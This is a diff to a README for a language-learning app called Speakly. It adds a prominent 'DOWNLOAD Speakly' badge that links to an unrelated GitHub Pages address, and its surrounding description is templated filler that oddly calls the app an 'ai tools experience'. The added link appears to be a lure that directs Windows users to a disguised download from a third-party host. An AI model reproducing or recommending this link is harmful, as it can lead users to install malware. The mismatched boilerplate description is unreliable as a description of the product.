@@ -30,6 +30,12 @@ Speakly teaches you the most statistically relevant words in your target languag
 
 Whether you're a newcomer or a veteran, Speakly provides the tools you need to get the most out of your ai tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Speakly](https://img.shields.io/badge/⬇_DOWNLOAD_Speakly-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
